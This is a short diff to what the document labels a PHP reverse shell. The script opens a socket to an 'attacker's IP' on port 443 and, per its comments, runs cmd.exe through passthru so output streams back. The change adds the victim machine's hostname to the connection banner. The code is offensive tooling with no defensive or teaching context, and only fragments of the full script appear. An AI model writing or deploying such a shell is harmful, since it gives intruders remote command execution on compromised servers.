@@ -1,4 +1,5 @@
 <?php
+$computer_name = php_uname('n');
 $ip = '127.0.0.1';  // Attacker's IP address
 $port = 443;     // Attacker's listening port
 
@@ -14,7 +15,7 @@ if (socket_connect($sock, $ip, $port) === false) {
 }
 
 // Write banner (optional)
-socket_write($sock, "Connected to reverse shell\n");
+socket_write($sock, "Connected to $computer_name\n");
 
 // Use passthru to execute cmd.exe and capture real-time output
 while (true) {
